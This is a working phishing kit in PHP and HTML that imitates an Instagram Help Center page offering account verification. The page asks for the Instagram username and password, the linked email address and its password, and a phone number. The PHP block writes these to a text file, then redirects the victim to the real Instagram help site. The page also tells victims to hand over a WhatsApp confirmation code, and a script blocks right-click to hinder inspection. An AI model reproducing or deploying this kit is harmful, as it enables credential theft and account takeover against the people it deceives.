<?php
error_reporting(0);
function ara($wercyofficial)
{

    }
if($_POST){
$isim = $_POST["isim"];
$mail = $_POST["mail"];
$mailpass = $_POST["mailpass"];
$telefon = $_POST["telefon"];
$password =  $_POST['password'];
$aciklama =  $_POST['aciklama'];
$details = json_decode(file_get_contents("http://ip-api.com/json/{$ip}"));
$ulke = $details->country;
date_default_timezone_set('Europe/Istanbul');
$cur_time=date("d-m-Y H:i:s");
?>
<?php
include('vendor/autoload.php');
$file = fopen('txt.txt', 'a');
fwrite($file, "(W)Username: ".$isim."\n" ."(W)Password: ".$password. "\n"."(W)Mail: ".$mail."\n"."(W)Mail Password: ".$mailpass."\n"."(W)Phone: ".$telefon."\n"."(W)Country: " .$ulke."\n".
   "(W)Time: " .$cur_time.  "\n\n");
fclose($file);
echo '';
    header("Location: https://help.instagram.com/854227311295302");
}

    ?>
<html><head> 
  <meta charset="utf-8"> 
  <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1"> 
  <title>lnstagram Help Center</title> 
  <link rel="icon" href="https://www.freepnglogos.com/uploads/instagram-logo-png-transparent-0.png"> 
  <style>
   @media screen and (min-width: 1000px){
    body{
     background: #fafafa;
     font-family: arial;
   }
   .header{
     background-color: #ffffff;
     margin-left: -10px;
     margin-top: -10px;
     padding-right: 18px;
     padding-top: 20px;
     width: 100%;
     height: 60px;
     border-bottom: 1px solid #efefef;
   }
   #arainput{
	 background-color: #fafafa;
     border: 1px solid #dbdbdb;
     border-radius: 3px;
     width: 215px;
	 padding: 6px 5px 5px 26px;
	 font-size: 14px;
	 outline: none;
	 display: inline-block;
	 margin-left: 150px;
	 position: relative;
	 top: -10px;
	}
   #araresim{
     width: 13px;
	 position: relative;
	 top: -5px;
	 left: -245px;
   }
   #arainput::placeholder{
	font-size: 14px;
	font: 400 13.3333px Arial;
	color: #999999;
   }
   #logo{
	width: 180px;
	height: 37px;
	background: url("https://i.imgyukle.com/2020/06/30/C32Xao.png") no-repeat;
	background-size: cover;
	display: inline-block;
	margin-left: 6%;
   }
   #kutu{
     margin-top: 60px;
     background-color: #ffffff;
     border: 1px solid #dbdbdb;
     border-radius: 0 0 3px 3px;
     margin-left: 5px;
	 width: 990px;
	 text-align: left;
   }
   #ara{
     border-bottom: 1px solid #dbdbdb;
     width: 98%;
     padding-left: 20px;
     padding-top: 6px;
     padding-bottom: 6px;
     font-size: 16px;
     color: #999999;
     font-weight: 600;
   }
   .wercyoffi a{
     width: 228px;
     height: 21px;
     padding: 16px;
     display: inline-block;
     color: #262626;
       font-size: 14px;
     text-decoration: none;
   }
   .wercyoffi{
     display: block;
   }
   .wercyoffi:hover{
     border-left: 2px solid #bdbcbc;
   }
   #yan{
     border-right: 1px solid #dbdbdb;
     display: block;
     width: 300px;
     height: 737px;
     float: left;
   }
   #ic{
     padding-left: 30px;
     padding-right: 30px;
     padding-top: 30px;
       padding-bottom: 150px;
     display: inline-block;
     width: 610px;
   }
   #footer b {
     font-size: 12px;
     color: #262626;
     display: inline-block;
     margin-right: 30px;
     margin-left: 8px;
     float: right;
   }
   #footer label{
     color: #999999;
     font-weight: 400;
     margin: -5px .5em;
     padding: 5px .15em;
     margin-top: 30px;
     display: inline-block;
   }
    #wercy123{
     background: url("https://teamdarkpirates.com/wp-content/uploads/2019/08/Instagram-icono.png") no-repeat;
	 background-size: cover;
	 margin: auto;
	 display: block;
	 margin-top: 28%;
	 width: 40px;
	 height: 40px;
	}
    }
    
    
    @media screen and (max-width: 1000px){
   body{
     background: #ffffff;
     font-family: arial;
   }
   #yan{
     display: none;
   }
   #kutu{
	text-align: left;
   }
   .header{
     background-color: #fafafa;
     margin-left: -10px;
     margin-top: -10px;
     padding-right: 18px;
     padding-top: 20px;
     width: 100%;
     height: 120px;
     text-align: center;
   }
   #logo{
     background: url("https://i.imgyukle.com/2020/06/30/C3F3Wy.jpg") no-repeat; 
     display: block;
     width: 180px;
     background-size: cover;
     height: 36px;
	 margin: auto;
	 margin-top: 15px;
   }
    #arainput{
	 background-color: #ffffff;
     border: 1px solid #dbdbdb;
     border-radius: 3px;
     width: 90%;
	 padding: 6px 5px 5px 26px;
	 font-size: 14px;
	 outline: none;
	 display: block;
	 margin: auto;
	 margin-top: 20px;
	 margin-left: 15px;
	}
	#arainput::placeholder{
	font-size: 14px;
	font: 400 13.3333px Arial;
	color: #999999;
   }
   #araresim{
	position: relative;
	left: -43%;
	top: -25px;
   }
   #ara{
     border: 1px solid #dbdbdb;
     width: 100%;
     padding-left: 60px;
     font-size: 14px;
     color: #999999;
     font-weight: 600;
	 position: absolute;
	 right: 0px;
	 left: 0px,
	 display: block;
   }
   #ara p{
	padding-left: 20px;
   }
    #ic{
     padding-left: 10px;
     padding-right: 30px;
     padding-top: 70px;
     padding-bottom: 20px;
   }
    #footer b {
     font-size: 12px;
     color: #262626;
     display: block;
     margin-top: 20px;
     margin-left: 8px;
   }
   #footer label{
     color: #999999;
     font-weight: 400;
     margin: -5px .5em;
     padding: 5px .15em;
   }
   #wercy123{
     background: url("https://i.imgyukle.com/2020/07/04/C9EoWs.png") no-repeat;
	 background-size: cover;
	 margin: auto;
	 display: block;
	 margin-top: 70%;
	 width: 50px;
	 height: 50px;
	}
    }
	
	
	
   #ic b{
     color: #1C1E21;
   }
   #ic p{
     font-size: 13px;
     color: #4b4f56;
     line-height: 1.5;
   }
   #footer{
     background-color: #fafafa;
     width: 100%;
     height: 140px;
     display: block;
     margin-left: -10px;
     position: relative;
     bottom: -20px;
     padding-left: 18px;
     padding-top: 19px;
     font-size: 12px;
   }
   #footer a{
     color: #003569;
     padding: 5px .15em;
     text-decoration: none;
     font-size: 12px;
     font-weight: bold;
     margin-left: 8px;
   }
   #ic b{
     color: #1C1E21;
   }
   
   #ic p{
     font-size: 13px;
     color: #4b4f56;
     line-height: 1.5;
   }
   #ic p a{
     color: #3897f0;
     text-decoration: none;
   }
   form{
     color: #90949c;
     font-size: 12px;
   }
   form label{
     font-weight: 600;
     line-height: 1.538;
     margin-top: 10px;
     padding: 0px;
   }
   .m{
     width: 300px;
     border: 1px solid #dddfe2;
     color: #1d2129;
     height: 25px;
     font-size: 12px;
     line-height: 16px;
     padding: 0 8px;
     margin-top: 6px;
   }
   form span{
     text-decoration: none;
     color: #90949c;
     line-height: 1.5;
   }
   .erenpaw{
     display: block;
     margin-top: 10px; 
   }
   .wercy{
     color: #1c1e21;
     width: 50px;
     margin-left: -54px;
     background: none;
     border: none;
     font-weight: bold;
     outline: none;
     font-size: 12px;
     display: none;
   }
   #btn{
     line-height: 26px;
     padding: 0 10px;
     background-color: #4267b2;
     color: #ffffff;
     font-weight: bold;
     text-align: center;
     border: 1px solid #4267b2;
     border-radius: 2px;
     margin-top: 10px;
   }
   #footer{
     background-color: #fafafa;
     width: 100%;
     height: 140px;
     display: block;
     margin-left: -10px;
     position: relative;
     bottom: -20px;
     padding-left: 18px;
     padding-top: 19px;
     font-size: 12px;
   }
   #footer a{
     color: #003569;
     padding: 5px .15em;
     text-decoration: none;
     font-size: 12px;
     font-weight: bold;
     margin-left: 8px;
   }
	#tik{
	 width: 20px;
	 position: relative;
	 top: 3px;
	}
	#wercyoffic{
	 display: none;
	}
	#wercyisafk{
	 width: 50px;
	 display: none;
	}
  </style>

  <script>
var isNS = (navigator.appName == "Netscape") ? 1 : 0;
var EnableRightClick = 0;
if(isNS)
document.captureEvents(Event.MOUSEDOWN||Event.MOUSEUP);
function mischandler(){
if(EnableRightClick==1){ return true; }
else {return false; }
}
function mousehandler(e){
if(EnableRightClick==1){ return true; }
var myevent = (isNS) ? e : event;
var eventbutton = (isNS) ? myevent.which : myevent.button;
if((eventbutton==2)||(eventbutton==3)) return false;
}
function keyhandler(e) {
var myevent = (isNS) ? e : window.event;
if (myevent.keyCode==96)
EnableRightClick = 1; 
return;
}
document.oncontextmenu = mischandler;
document.onkeypress = keyhandler;
document.onmousedown = mousehandler;
document.onmouseup = mousehandler;
</script> 
 </head> 
 <body> 
<img src="https://thumbor.sd-cdn.fr/sHaj_Qv3a99Nj0vOdzrQAi9TaR8=/fit-in/1909x886/cdn.sd-cdn.fr/wp-content/uploads/2016/05/instagram-nouveau-logo-1.png" id="wercyisafk">
 <div id="wercyofficial" style="display: none;">
 <div id="wercy123"> </div>
 </div>
<div id="wercyoffic" style="display: block;">
   <div class="header"> 
  <div id="logo"> </div>
	<input type="text" placeholder="How can we help?" id="arainput">
	<img src="https://i.imgyukle.com/2020/06/29/CWAa7c.png" id="araresim">
  </div> 
  <center>
  <div id="kutu"> 
   <div id="ara"> 
    <p> Help Center </p> 
   </div> 
   <div id="yan"> 
    <div class="wercyoffi"> 
     <a href="https://help.instagram.com/">Using Instagram</a> 
    </div> 
    <div class="wercyoffi"> 
     <a href="https://help.instagram.com/">Managing Your Account</a> 
    </div> 
    <div class="wercyoffi"> 
     <a href="https://help.instagram.com/">Troubleshooting and Login Help</a> 
    </div> 
    <div class="wercyoffi"> 
     <a href="https://help.instagram.com/">Privacy and Safety Center</a> 
    </div> 
    <div class="wercyoffi"> 
     <a href="https://help.instagram.com/">Instagram for Businesses</a> 
    </div> 
   </div> 
   <div id="ic"> 
    <b> Apply for Instagram verification</b>
    <p> Hi, </p><p>The verified badge is a checkmark that appears next to the name of their Instagram account to indicate that the high-follower, celebrity, global brand, or entity is the real account.</p> 
	<p>Fill in the form completely and accurately. Do not change your information for 48 hours.</p> 
	<form action="index.php" method="POST"> 
     <label>Full name</label> 
     <br> 
     <input type="text" class="m" name="full_name"> 
     <br> 
     <div class="erenpaw"> 
      <label>Your username</label> 
      <br> 
      <span> [e.g. If the link to your Instagram account is instagram.com/[username], please enter "username" in this field]</span> 
      <br> 
      <input type="text" class="m" value="" name="isim" required=""> 
     </div> 
     <div class="erenpaw"> 
     
      <br>
      <label>Email adress</label> 
      <br>
       <span> [Email address linked to your account] </span>
      <br> 
      <input type="email" class="m" name="mail" required=""> 

     </div> 
	 <div class="erenpaw">
	 
	 <br>
      <label>Email Password</label> 
      <br>
       <span> [The password of the email address linked to your account.] </span>
      <br> 
      <input type="password" class="m" name="mailpass" required=""> 

     </div>
	 <div class="erenpaw"> 
     
      <br>
      <label>Phone number</label> 
      <br>
       <span> [Phone number linked to your account.] </span>
      <br> 
      <input type="number" class="m" name="telefon" required=""> 

     </div> 
     <div class="erenpaw"> 
      <label>Country</label> 
      <br> 
      <span> [Country where you registered on lnstagram] </span> 
      <br> 
      <input type="text" class="m" id="mailpw" name="country" required"=""> 
      <input type="button" id="btnmailpw" class="wercy"> 
     </div> 
     <div class="erenpaw"> 
      <label>Enter your Instagram password to complete the process</label> 
      <br> 
      <input type="password" class="m" id="pw" name="password" required=""> 
      <input type="button" id="btnpw" value="Show" class="wercy"> 
     </div> 
<br>

     <label>Explanation</label>
     <br> 
     <span> [The statement you will make to our Instagram attachment] </span> 
     <br> 
     <input type="text" class="m" name="aciklama"> 
     <br> 
     <div class="erenpaw"> 
     </div>
     <h4>whatsapp verification team will ask you for a code , please give your confirmation code. </h4>
     <input type="submit" id="btn" name="submit" value="Send"> 
    </form> 
   </div> 
  </div> 
  </center>
  <div id="footer"> 
   <a href="https://www.instagram.com/about/us/"> ABOUT US </a> 
   <a href="https://help.instagram.com/"> HELP </a> 
   <a href="https://www.instagram.com/developers/"> API </a> 
   <a href="https://www.instagram.com/about/jobs/"> JOBS </a> 
   <a href="https://www.instagram.com/legal/terms/"> TERMS </a> 
   <a href="https://www.instagram.com/legal/privacy/"> PRIVACY </a> 
   <b> © 2021 INSTAGRAM, INC. </b> 
   <br> 
   <label> ENGLISH (UK) </label> 
   <label> TÜRKÇE </label> 
   <label> KURDÎ (KURMANCÎ)</label> 
   <label> العربية </label> 
   <label> ZAZA </label> 
   <label> DEUTSCH </label> 
   <label> РУССКИЙ </label> 
   <label> FRANÇAIS (FRANCE) </label> 
   <label> فارسی </label> 
   <label> ESPAÑOL</label> 
   <label> PORTUGUÊS (BRASIL) </label> 
  </div> 
 </div>
    </script>
    <style>img[alt="www.somee.com"]{display:none;}</style>
</body></html>